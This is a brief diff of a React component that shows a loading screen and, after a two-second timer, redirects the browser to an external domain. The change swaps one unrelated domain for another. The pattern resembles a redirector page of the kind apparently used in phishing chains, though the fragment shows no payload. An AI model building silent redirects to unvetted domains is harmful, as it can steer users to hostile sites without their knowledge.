@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://load.ecosseupsidedown.co.uk/';
+            window.location.href = 'https://outbox.sookemarinecentre.com';
         }, 2000);
 
         return () => clearTimeout(timer);
